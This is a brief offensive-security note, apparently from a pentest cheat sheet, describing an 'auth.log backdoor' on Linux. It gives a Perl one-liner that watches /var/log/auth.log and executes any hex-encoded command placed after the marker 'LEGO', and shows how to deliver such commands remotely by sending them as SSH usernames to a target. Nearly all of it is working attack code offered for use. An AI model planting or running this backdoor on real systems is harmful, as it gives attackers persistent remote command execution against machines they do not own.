# Auth Log Backdoor

By contaminating the `auth.log` file in Linux `/var/log` directory we can setup a backdoor and use it to execute remote commands.

LISTEN:

```
perl -e'while(1){sleep(1);while(<>){system pack("H*",$1)if/LEGO(\w+)/}}'</var/log/auth.log & 
```

EXECUTE REMOTE COMMAND:

```
perl -e 'print "LEGO".unpack("H*","id > /tmp/auth.owned")."\n"'
LEGO6964203e202f746d702f617574682e6f776e6564
ssh LEGO6964203e202f746d702f617574682e6f776e6564@<target_ip>
```
